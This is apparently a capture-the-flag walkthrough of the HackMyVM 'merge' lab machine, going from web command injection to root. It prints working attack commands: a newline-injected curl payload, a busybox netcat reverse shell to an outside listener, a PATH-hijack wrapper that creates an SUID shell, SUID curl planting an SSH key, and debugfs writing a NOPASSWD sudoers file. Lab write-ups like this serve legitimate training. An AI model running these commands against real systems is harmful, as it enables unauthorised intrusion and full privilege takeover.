# merge

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| merge | 1111 | intermediate | HackMyVM |

**Summary:** An nginx front end on 192.168.56.176 served a Chinese language offline IP lookup form whose `ip` POST parameter reached a shell context unsanitized, so a newline smuggled through curl executed commands as `www-data` and a busybox netcat callback handed over a full PTY through penelope. Enumeration of /opt exposed a world readable pass.txt with the password of the mono account, and SSH access as mono revealed a sudo rule allowing `dirty_merge` as the lnnn user with `env_keep+=PATH` and `!secure_path`, a combination that invites PATH hijacking. A fake `ip` wrapper that copies bash and stamps the SUID bits was staged in /tmp/hijack, and although the patched kernel defused the exploit itself, the hijacked call ran as lnnn and produced an SUID lnnn shell in /home/mono/.cache. As lnnn, a hint file pointed at the parameter help of an SUID curl owned by admin, whose `file://` support wrote a freshly generated public key straight into /home/admin/.ssh/authorized_keys with `--create-dirs`, yielding an SSH session as admin. The admin account was group owner of /etc/group, so editing it added admin to the disk and sudo groups, and after a fresh login the disk group granted raw block device access for debugfs to inject a NOPASSWD sudoers fragment directly into the ext4 filesystem on /dev/sda1, closing the chain with `sudo -i` and both flags.

---

## Reconnaissance

The assessment opened with host discovery and service profiling across the local VirtualBox subnet.

1. A ping sweep using ARP discovery identified the live guests, and the target was pinned at `192.168.56.176`:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-09 10:34 +0700  
Nmap scan report for 192.168.56.100  
Host is up (0.00034s latency).  
MAC Address: 08:00:27:3E:66:DF (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.176  
Host is up (0.00058s latency).  
MAC Address: 08:00:27:BC:BF:66 (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.1  
Host is up.  
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.23 seconds  
```

Two guests answered (`192.168.56.100` and `192.168.56.176`) along with the host adapter at `192.168.56.1`. The target address was stored in a variable and a full TCP port scan with version and script detection ran in one pass:

```zsh
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-09 10:34 +0700  
Nmap scan report for 192.168.56.176  
Host is up (0.00096s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)  
80/tcp open  http    nginx  
|_http-title: \xE7\xA6\xBB\xE7\xBA\xBFIP\xE5\x9C\xB0\xE5\x9D\x80\xE6\x9F\xA5\xE8\xAF\xA2  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds
```

Two ports were exposed: OpenSSH 10.0p2 on 22 and nginx on 80. The HTTP title is the Chinese phrase 离线IP地址查询, which translates to offline IP address lookup.

2. The web root was fetched with curl to inspect the application:

```zsh
❯ curl -i http://$ip/  
HTTP/1.1 200 OK  
Server: nginx  
Date: Wed, 09 Sep 2026 03:35:18 GMT  
Content-Type: text/html; charset=UTF-8  
Transfer-Encoding: chunked  
Connection: keep-alive  
  
<!DOCTYPE html>  
<html lang="zh">  
<head>  
<meta charset="UTF-8">  
<meta name="viewport" content="width=device-width, initial-scale=1.0">  
<title>离线IP地址查询</title>  
<style>  
*{margin:0;padding:0;box-sizing:border-box}  
body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sa  
ns-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}  
.main{width:100%;max-width:600px;padding:2rem;display:flex;flex-direction:column;align-items:center;justify-cont  
ent:center;margin-top:-8vh}  
.form-group{width:100%;display:flex;gap:0.5rem}  
.form-group input{flex:1;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:0.75rem 1rem;colo  
r:#c9d1d9;font-size:0.95rem;outline:none;transition:border-color 0.2s}  
.form-group input:focus{border-color:#58a6ff}  
.form-group button{background:#238636;color:#fff;border:none;border-radius:6px;padding:0.75rem 1.5rem;font-size:  
0.9rem;cursor:pointer;transition:background 0.2s;white-space:nowrap}  
.form-group button:hover{background:#2ea043}  
.result{width:100%;margin-top:1.5rem;padding:1rem;border-radius:6px;min-height:3rem}  
.result-success{background:#161b22;border:1px solid #238636}  
.result-error{background:#161b22;border:1px solid #da3633;color:#f85149}  
.result pre{font-size:0.9rem;white-space:pre-wrap;word-break:break-all}  
.placeholder-result{width:100%;margin-top:1.5rem;min-height:3rem;visibility:hidden}  
.footer{position:fixed;bottom:0;left:0;right:0;padding:1.5rem 0;text-align:center;width:100%}  
.footer a{display:inline-block;font-size:0.7rem;color:#8b949e;border:1px solid #30363d;padding:2px 8px;border-ra  
dius:12px;letter-spacing:0.5px;text-decoration:none;transition:color 0.2s,border-color 0.2s}  
.footer a:hover{color:#58a6ff;border-color:#58a6ff}  
</style>  
</head>  
<body>  
<div class="main">  
<form class="form-group" method="POST" action="">  
<input type="text" name="ip" id="ipInput" placeholder="输入IP地址查询" value="" autofocus>  
<button type="submit">查询</button>  
</form>  
<div class="placeholder-result"></div>  
</div>  
<div class="footer">  
<a href="https://maze-sec.com" target="_blank">maze-sec</a>  
</div>  
<script>  
document.addEventListener('keydown', function(e) {  
   if (e.key === '/' && document.activeElement !== document.getElementById('ipInput')) {  
       e.preventDefault();  
       document.getElementById('ipInput').focus();  
   }  
});  
</script>  
</body>  
</html>
```

The page renders a single POST form with one text field named `ip` and a submit button labelled 查询, and a footer linking to maze-sec.com. Nothing else is exposed in the markup, so the `ip` parameter is the entire attack surface.

![port 80 web form](Pasted%20image%2020260909103555.png)

The screenshot confirms the minimalist lookup form with its dark theme and green submit button.

---

## Initial Access

### Command Injection in the ip Parameter

3. A newline injected into the `ip` field turned out to reach a shell context on the server. Appending `id` to a benign lookup produced command output inside the result block, and a tab separated `which` confirmed busybox on the box:

```zsh
❯ curl -s -X POST http:/$ip/ --data-urlencode $'ip=1.2.3.4\nid' | grep "uid"  
uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>  
  
~/projects/labs/hmv                                                                                    10:36:29  
❯ curl -s -X POST http:/$ip/ --data-urlencode $'ip=1.2.3.4\nwhich\tbusybox' | grep "busybox"  
which   busybox" autofocus>  
/usr/bin/busybox</pre></div>
```

The response embeds `uid=33(www-data)`, proving arbitrary command execution under the web server account, and `/usr/bin/busybox` provides the delivery vehicle for the next stage.

### Reverse Shell over Busybox Netcat

4. penelope was started as the listener:

```zsh
❯ penelope -p 5555              
[+] Listening for reverse shells on 0.0.0.0:5555 -> 127.0.0.1 • 192.168.0.6 • 172.16.0.2 • 192.168.56.1  
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

5. busybox nc with the `-e` flag delivered the reverse shell:

```zsh
❯ curl -s -X POST http://$ip/ --data-urlencode $'ip=1.2.3.4\nbusybox\tnc\t192.168.56.1\t5555\t-e\t/bin/bash'
```

6. The callback landed instantly with a full PTY, and the first enumeration listed the interactive accounts:

```zsh
[+] [New Reverse Shell] => Merge 192.168.56.176 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>  
[+] ⭐ Agent deployed via /usr/bin/python3  
[+] Interacting with session [1] • PTY • Menu key F12 ⇐  
[+] Session log: /home/setyanoegraha/.penelope/sessions/Merge~192.168.56.176-Linux-x86_64/2026_09_09-10_39_02-20  
4-www-data_33.log  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
www-data@Merge:~/html$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
www-data@Merge:~/html$ cat /etc/passwd | grep "sh$"  
root:x:0:0:root:/root:/bin/bash  
mono:x:1000:1000::/home/mono:/bin/bash  
lnnn:x:1001:1001::/home/lnnn:/bin/bash  
admin:x:1002:1002::/home/admin:/bin/bash
```

The session runs as `www-data` on host Merge, and /etc/passwd reveals three human users: mono (UID 1000), lnnn (UID 1001), and admin (UID 1002).

---

## Lateral Movement

### Credential Recovery from /opt and SSH as mono

7. A listing of /opt showed three items of interest:

```zsh
www-data@Merge:~/html$ ls -la /opt  
total 20  
drwxr-xr-x  4 root  root 4096 May 22 09:19 .  
drwxr-xr-x 18 root  root 4096 May 16 05:19 ..  
drwxr-xr-x  2 root  root 4096 May 22 06:09 Dirty-Merge  
drwxr-x---  2 admin lnnn 4096 May 22 09:20 admin  
-rw-r--r--  1 root  root   30 May 22 06:07 pass.txt  
www-data@Merge:~/html$ cat /opt/pass.txt    
mono:0ysP8axqGSAkvXnkvxxukVnz
```

The `Dirty-Merge` directory and the `admin` directory hint at the escalation path, while pass.txt is world readable and leaks `mono:0ysP8axqGSAkvXnkvxxukVnz` in plain text.

8. SSH as mono accepted the leaked password:

```zsh
❯ ssh mono@$ip  
mono@192.168.56.176's password:    
Linux Merge 7.0.8-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.0-8.1~trixie (2026-05-15) x86_64  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Wed Apr 29 21:55:46 2026 from 192.168.193.14  
mono@Merge:~$ id;whoami;hostname  
uid=1000(mono) gid=1000(mono) groups=1000(mono)  
mono  
Merge
```

The kernel banner shows liquorix 7.0.8 on Debian trixie, a detail that matters shortly.

### Sudo PATH Hijacking of dirty_merge

9. sudo -l mapped out the next hop:

```zsh
mono@Merge:~$ sudo -l  
Matching Defaults entries for mono on Merge:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,  
   use_pty, env_keep+=PATH, !secure_path  
  
User mono may run the following commands on Merge:  
   (lnnn) NOPASSWD: /opt/Dirty-Merge/dirty_merge
```

mono may run /opt/Dirty-Merge/dirty_merge as lnnn without a password. The defaults entry `env_keep+=PATH` together with `!secure_path` means the environment PATH survives sudo, so any program the binary spawns by name resolves through mono's PATH. The binary itself is a Dirty Frag style exploit shipped with its source (`gro_fragnesia.c`), but the kernel bug it targets has been patched on this liquorix build, so the intended local escalation fails and the PATH hijack is the way through.

10. Grepping the source confirms which external programs it calls by name:

```zsh
mono@Merge:~$ grep -n 'system\|exec\|popen\|PATH\|getenv' /opt/Dirty-Merge/gro_fragnesia.c | head    
20:// Requires: ip, ethtool in PATH (for veth + GRO setup)  
142:static char target_file_buf[PATH_MAX];  
663:    ret = system("ip link add veth0 type veth peer name veth1");  
667:    ret = system("ip addr add 10.0.0.1/24 dev veth0");  
671:    ret = system("ip link set veth0 up");  
696:            ret = system("ip link set lo up");  
700:            ret = system("ip addr add 10.0.0.2/24 dev veth1");  
704:            ret = system("ip link set veth1 up");  
708:            ret = system("ethtool -K veth1 gro on");  
734:    ret = system(buf);
```

Several `system("ip ...")` invocations and one ethtool call all resolve through PATH.

11. The mount layout was checked before staging: / is ext4 mounted without nosuid, while /tmp carries `nosuid,nodev`, so the hijack script can live in /tmp but any SUID artifact must be dropped under /home:

```zsh
mono@Merge:~$ mount | grep -v nosuid  
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)  
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=40,pgrp=1,timeout=0,minproto=5,maxproto=5,dire  
ct,pipe_ino=3050)  
mono@Merge:~$ mount | grep /tmp  
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,size=1004900k,nr_inodes=1048576,inode64,huge=within_size)
```

12. A wrapper named `ip` was staged in /tmp/hijack that copies bash into /home/mono/.cache, stamps the SUID and SGID bits onto it, then execs the real /usr/sbin/ip to keep the exploit running. Sudo then fired at dirty_merge. The log block mixes the heredoc, the exploit's page cache progress, and its failure: the byte writes report the fixed behavior (bytes unchanged) and the veth setup dies with `cannot set groups: Operation not permitted`, the signature of the patched kernel and the missing capability in the lnnn context:

```zsh
mono@Merge:~$ mkdir -p /tmp/hijack /home/mono/.cache  
mono@Merge:~$ cat > /tmp/hijack/ip << 'EOF'     
#!/bin/bash     
cp /bin/bash /home/mono/.cache/sh     
chmod ug+s /home/mono/.cache/sh     
exec /usr/sbin/ip "$@"     
[*] smashing 192 bytes into read-only page cache  changed=0  skipped=16  remaining=176  
 0000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00    
 0010 [03]00 3e 00 01 00 00 00  78 00 40 00 00 00 00 00    
 0020  40 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00    
 0030  00 00 00 00 40 00 38 00  01 00 00 00 00 00 00 00    
 0040  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00    
 0050  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00    
 0060  b8 00 00 00 00 00 00 00  b8 00 00 00 00 00 00 00    
 0070  00 10 00 00 00 00 00 00  31 ff 31 f6 31 c0 b0 6a    
 0080  0f 05 b0 69 0f 05 b0 74  0f 05 6a 00 48 8d 05 12    
 0090  00 00 00 50 48 89 e2 48  8d 3d 12 00 00 00 31 f6    
 00a0  6a 3b 58 0f 05 54 45 52  4d 3d 78 74 65 72 6d 00    
 00b0  2f 62 69 6e 2f 73 68 00  00 00 00 00 00 00 00 00    
 [====----------------------------------------------] 16/192 (8%)  
────────────────────────────────────────────────────────────  
[-] [13/192] +000c already=00 skip  
[-] [14/192] +000d already=00 skip  
[-] [15/192] +000e already=00 skip  
[-] [16/192] +000f already=00 skip  
byte_flip_nonce=27 stream_byte=01  
byte_flip_packet_iv=cccccccc0000001b  
[*] [17/192] +0010  03 -> 02  xor=01 seq=2 nonce=27  
firing espintcp splice...  
sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=16 file_off_next=4112  
receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1  
sender_status=0 receiver_status=0  
[-] fixed behavior: byte unchanged at index=16 offset=16  
  
: cannot set groups: Operation not permitted
```

13. Despite the failed exploit, the hijack did its job in the lnnn context before the crash:

```zsh
mono@Merge:~$ ls -la .cache/sh    
-rwsr-sr-x 1 lnnn lnnn 1298416 Sep  8 23:43 .cache/sh  
mono@Merge:~$ /home/mono/.cache/sh -p -c "id"  
uid=1000(mono) gid=1000(mono) euid=1001(lnnn) egid=1001(lnnn) groups=1001(lnnn),1000(mono)
mono@Merge:~$ /home/mono/.cache/sh -p    
sh-5.2$ id;whoami  
uid=1000(mono) gid=1000(mono) euid=1001(lnnn) egid=1001(lnnn) groups=1001(lnnn),1000(mono)  
lnnn  
```

`.cache/sh` carries the SUID and SGID bits owned by lnnn, and running it with `-p` yields `euid=1001(lnnn)`.

### SUID curl and Authorized Key Planting for admin

14. As lnnn, the restricted /opt/admin directory becomes readable:

```zsh
sh-5.2$ ls -la /opt/admin/  
total 328  
drwxr-x--- 2 admin lnnn    4096 May 22 09:20 .  
drwxr-xr-x 4 root  root    4096 May 22 09:19 ..  
-rwsr-sr-x 1 admin admin 321880 May 22 09:19 curl  
-rw-r--r-- 1 root  root     105 May 22 09:20 hint.txt  
sh-5.2$ cat /opt/admin/hint.txt    
关注详细的参数帮助信息  
Focus on the detailed parameter help information
```

The directory holds an SUID curl owned by admin and a bilingual hint: 关注详细的参数帮助信息, Focus on the detailed parameter help information.

15. curl's `file://` support combined with its admin SUID turns it into an arbitrary file writer. A keypair was generated, the public key was written into /home/admin/.ssh/authorized_keys with `--create-dirs`, and SSH as admin succeeded:

```zsh
sh-5.2$ ssh-keygen -q -N '' -f /tmp/adminkey  
sh-5.2$ /opt/admin/curl file:///tmp/adminkey.pub -o /home/admin/.ssh/authorized_keys --create-dirs  
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                Dload  Upload   Total   Spent    Left  Speed  
100    92  100    92    0     0  10035      0 --:--:-- --:--:-- --:--:-- 10222  
sh-5.2$ ssh -i /tmp/adminkey admin@localhost  
The authenticity of host 'localhost (::1)' can't be established.  
ED25519 key fingerprint is SHA256:MjoUe5ON03T2UcSPmlU3evmpGUywqf/3IUm0+1p77cI.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Could not create directory '/home/mono/.ssh' (Permission denied).  
Failed to add the host to the list of known hosts (/home/mono/.ssh/known_hosts).  
Linux Merge 7.0.8-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.0-8.1~trixie (2026-05-15) x86_64  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.
admin@Merge:~$ id;whoami;hostname  
uid=1002(admin) gid=1002(admin) groups=1002(admin)  
admin  
Merge
```

The session confirms `uid=1002(admin)` on host Merge.

---

## Privilege Escalation

### Writable /etc/group and debugfs sudoers Injection

16. As admin, a search for group writable files under /etc:

```zsh
admin@Merge:~$ find /etc -type f -group admin -writable 2>/dev/null  
/etc/group
```

17. /etc/group is owned by root with group admin and mode 662, so the admin group can rewrite it:

```zsh
admin@Merge:~$ ls -la /etc/group  
-rw-rw-r-- 1 root admin 665 May 22 06:04 /etc/group
```

18. The full group listing before modification:

```zsh
admin@Merge:~$ cat /etc/group  
root:x:0:  
daemon:x:1:  
bin:x:2:  
sys:x:3:  
adm:x:4:  
tty:x:5:  
disk:x:6:  
lp:x:7:  
mail:x:8:  
news:x:9:  
uucp:x:10:  
man:x:12:  
proxy:x:13:  
kmem:x:15:  
dialout:x:20:  
fax:x:21:  
voice:x:22:  
cdrom:x:24:  
floppy:x:25:  
tape:x:26:  
sudo:x:27:  
audio:x:29:  
dip:x:30:  
www-data:x:33:  
backup:x:34:  
operator:x:37:  
list:x:38:  
irc:x:39:  
src:x:40:  
shadow:x:42:  
utmp:x:43:  
video:x:44:  
sasl:x:45:  
plugdev:x:46:  
staff:x:50:  
games:x:60:  
users:x:100:  
nogroup:x:65534:  
systemd-journal:x:999:  
systemd-network:x:998:  
crontab:x:997:  
input:x:996:  
sgx:x:995:  
clock:x:994:  
kvm:x:993:  
render:x:992:  
netdev:x:101:  
systemd-timesync:x:991:  
messagebus:x:990:  
_ssh:x:102:  
mono:x:1000:  
lnnn:x:1001:  
admin:x:1002:
```

19. admin was appended to the disk group (GID 6) and the sudo group (GID 27) through a sed pass over a copy:

```zsh
admin@Merge:~$ cp /etc/group /tmp/group.new  
admin@Merge:~$ sed 's/^disk:x:6:/disk:x:6:admin/' /tmp/group.new | sed 's/^sudo:x:27:/sudo:x:27:admin/' > /tmp/g  
admin@Merge:~$ cat /tmp/g > /etc/group  
admin@Merge:~$ grep -E "^(disk|sudo):" /etc/group  
disk:x:6:admin  
sudo:x:27:admin
```

20. The running session does not pick up new group memberships:

```zsh
admin@Merge:~$ id  
uid=1002(admin) gid=1002(admin) groups=1002(admin)
```

21. A fresh login was required. A new keypair was generated, the public key was appended to authorized_keys, and admin reconnected over SSH:

```zsh
admin@Merge:~$ ssh-keygen -q -N '' -f /home/admin/.ssh/id_rsa    
admin@Merge:~$ cat /home/admin/.ssh/id_rsa.pub >> /home/admin/.ssh/authorized_keys  
admin@Merge:~$ ssh -i /home/admin/.ssh/id_rsa admin@localhost  
The authenticity of host 'localhost (::1)' can't be established.  
ED25519 key fingerprint is SHA256:MjoUe5ON03T2UcSPmlU3evmpGUywqf/3IUm0+1p77cI.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.  
Linux Merge 7.0.8-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.0-8.1~trixie (2026-05-15) x86_64  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Tue Sep  8 23:46:00 2026 from ::1  
admin@Merge:~$ id  
uid=1002(admin) gid=1002(admin) groups=1002(admin),6(disk),27(sudo)
```

The refreshed identity now shows `groups=1002(admin),6(disk),27(sudo)`.

22. Membership in the disk group grants access to the raw block device, a classic route to arbitrary filesystem surgery. debugfs is present and world executable:

```zsh
admin@Merge:~$ which debugfs dd python3  
/usr/bin/dd  
/usr/bin/python3  
admin@Merge:~$ ls -la /usr/sbin/debugfs    
-rwxr-xr-x 1 root root 255824 Mar  9  2026 /usr/sbin/debugfs
```

23. df confirms the root filesystem lives on /dev/sda1:

```zsh
admin@Merge:~$ df -h  
Filesystem      Size  Used Avail Use% Mounted on  
udev            948M     0  948M   0% /dev  
tmpfs           197M  576K  196M   1% /run  
/dev/sda1        38G  2.7G   33G   8% /  
tmpfs           982M     0  982M   0% /dev/shm  
tmpfs           5.0M     0  5.0M   0% /run/lock  
tmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-journald.service  
tmpfs           982M   20K  982M   1% /tmp  
tmpfs           1.0M     0  1.0M   0% /run/credentials/getty@tty1.service  
tmpfs           197M  8.0K  197M   1% /run/user/1000  
tmpfs           197M  8.0K  197M   1% /run/user/1002
```

24. A sudoers fragment was authored in /tmp, written into the ext4 filesystem as /etc/sudoers.d/a with debugfs, and its inode metadata was fixed to mode 0440 owned by root and group root:

```zsh
admin@Merge:~$ echo 'admin ALL=(ALL) NOPASSWD: ALL' > /tmp/a  
admin@Merge:~$ /usr/sbin/debugfs -w /dev/sda1  
debugfs 1.47.2 (1-Jan-2025)  
debugfs:  write /tmp/a /etc/sudoers.d/a  
Allocated inode: 542509  
debugfs:  sif <542509> i_mode 0100440  
debugfs:  sif <542509> i_uid 0  
debugfs:  sif <542509> i_gid 0  
debugfs:  q  
admin@Merge:~$ sudo -l  
Matching Defaults entries for admin on Merge:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,  
   use_pty, env_keep+=PATH, !secure_path  
  
User admin may run the following commands on Merge:  
   (ALL : ALL) ALL  
   (ALL) NOPASSWD: ALL
```

sudo -l now reports `(ALL) NOPASSWD: ALL` for admin.

25. The final jump and both flags:

```zsh
admin@Merge:~$ sudo -i  
root@Merge:~# id;whoami;hostname  
uid=0(root) gid=0(root) groups=0(root)  
root  
Merge  
root@Merge:~# cat /home/lnnn/user.txt /root/root.txt    
flag{user-b67...}  
flag{root-1b5...}
```

`sudo -i` dropped into a root shell on host Merge, and the user flag from /home/lnnn/user.txt plus the root flag from /root/root.txt completed the run.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep and full port scan pinned the target at 192.168.56.176 with OpenSSH on 22 and an nginx IP lookup form on 80.
2. **Vulnerability Discovery**: The `ip` POST parameter of the lookup form was found to pass unsanitized input into a shell context, and busybox was confirmed on the target for payload delivery.
3. **Exploitation**: Newline injection executed commands as `www-data`, and a busybox nc reverse shell was caught by penelope with a full PTY.
4. **Internal Enumeration**: A world readable /opt/pass.txt leaked mono's password, sudo offered `dirty_merge` as lnnn with an attacker controlled PATH, an SUID curl as admin allowed an authorized key plant for lnnn, and /etc/group proved writable by the admin group.
5. **Privilege Escalation**: Group edits added admin to the disk and sudo groups, and debugfs wrote a root owned sudoers fragment into the ext4 filesystem on /dev/sda1, producing `sudo -i` as root and both flags.
